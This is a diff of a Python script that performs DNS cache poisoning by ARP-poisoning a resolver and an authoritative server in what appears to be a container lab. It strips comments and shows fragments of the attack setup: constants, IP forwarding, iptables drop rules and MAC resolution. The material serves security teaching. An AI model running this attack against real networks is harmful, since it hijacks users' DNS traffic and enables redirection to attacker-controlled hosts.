@@ -1,7 +1,4 @@
-#!/usr/bin/python3
 """
-cache_poisoning.py - Classic DNS cache poisoning via ARP-based MITM.
-
 Attack overview:
   1. ARP-poison the resolver (10.9.0.53) and authoritative (10.9.0.153) so all
      DNS traffic between them passes through the attacker.
@@ -10,7 +7,7 @@ Attack overview:
   3. Sniff the forwarded DNS query and immediately send a burst of crafted DNS
      responses with FAKE_IP as the answer.
 
-Because the resolver uses a *fixed* source port (33333), the only unknown in the
+Because the resolver uses a fixed source port (33333), the only unknown in the
 forged packet is the 16-bit Transaction ID, which we read directly from the
 intercepted query - so no guessing is needed.
 
@@ -18,7 +15,7 @@ Run inside the attacker container:
     python3 cache_poisoning.py
 
 Verify on client:
-    dig @10.9.0.53 www.example.com +short   # should return 6.6.6.6
+    dig @10.9.0.53 www.example.com +short
 """
 
 from scapy.all import *
@@ -30,24 +27,20 @@ import threading
 import time
 
 RESOLVER_IP = "10.9.0.53"
-AUTH_SERVER_IP = "10.9.0.153"   # Authoritative server IP (from docker-compose / zone file)
+AUTH_SERVER_IP = "10.9.0.153"
 ATTACKER_IP = "10.9.0.10"
 TARGET_DOMAIN = "www.example.com"
 FAKE_IP = "6.6.6.6"            # IP we want the resolver to cache for TARGET_DOMAIN
 POISON_INTERVAL = 1.0           # seconds between ARP poison refreshes
 
-################### DO NOT TOUCH ####################
+
 running = True
 resolver_mac = None
 auth_mac = None
 
 
+# Setup ip forwarding
 def set_ip_forward(enabled):
-    """Enable or disable Linux IP forwarding so intercepted packets are relayed.
-
-    Input:  enabled - bool
-    Output: None (modifies kernel parameter via sysctl)
-    """
     value = "1" if enabled else "0"
     subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"], check=False, stdout=subprocess.DEVNULL)
 
@@ -85,6 +78,7 @@ def set_drop_rule(enabled):
     subprocess.run(["iptables", "-w", action, *base_cmd[4:]], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
+# we reolve the MAC address for a given IP via ARP
 def resolve_mac(ip):
     """Resolve the MAC address for a given IP via ARP.
 
